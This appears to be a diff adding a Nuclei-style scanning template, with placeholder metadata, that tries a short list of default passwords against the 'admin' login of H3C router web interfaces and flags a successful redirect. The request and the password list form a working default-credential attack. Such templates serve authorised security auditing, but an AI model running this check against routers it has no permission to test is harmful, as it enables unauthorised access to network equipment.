@@ -1,0 +1,42 @@
+id: h3c-router-default-login
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |+
+        GET /wnm/frame/login.php?user_name=admin&password={{password}}&ssl=true&host={{Hostname}}&lang=cn HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: vindex==01=08=0AB00=0R; supportLang=cn%2Cen; lang=cn
+        Sec-Ch-Ua: "Chromium";v="109", "Not_A Brand";v="99"
+        Accept: application/json, text/javascript, */*; q=0.01
+        X-Requested-With: XMLHttpRequest
+        Sec-Ch-Ua-Mobile: ?0
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
+        Sec-Ch-Ua-Platform: "macOS"
+        Sec-Fetch-Site: same-origin
+        Sec-Fetch-Mode: cors
+        Sec-Fetch-Dest: empty
+        Referer: https://{{Hostname}}/web/frame/login.html
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+      
+    payloads:
+      password:
+        - Admin@123
+        - test
+        - huawei@123
+        - Huawei@123
+        - admin
+        - test@123
+      stop-at-first-match: true                
+    matchers:
+      - type: word
+        words:
+          - "/wnm/frame/redirect.php"            
